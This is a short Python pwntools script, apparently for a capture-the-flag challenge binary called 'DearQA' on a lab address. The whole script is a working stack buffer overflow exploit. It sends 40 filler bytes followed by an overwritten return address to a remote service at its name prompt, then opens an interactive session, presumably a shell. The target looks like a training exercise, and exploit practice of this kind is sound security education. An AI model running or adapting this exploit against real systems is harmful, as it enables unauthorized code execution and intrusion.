from pwn import *

host = '10.10.81.146'     #to modify
port = 5700                #to modify

address = p64(0x00400686)     # further arguments or adresses 
                              # little endian format: p64() for x64 arch and p32() for x82

payload = b"A"*40 + address        # bytes to send

context(terminal = ['/bin/bash','new-window'])
binary =  context.binary = ELF('./DearQA.DearQA')
context(os='linux', arch='amd64')


connection = remote(host,port)
log.info("Initialisation of BOF attack")
connection.recvuntil("What's your name: ")
connection.sendline(payload)
log.info("Payload sent")
connection.interactive()  #If reached, great success!
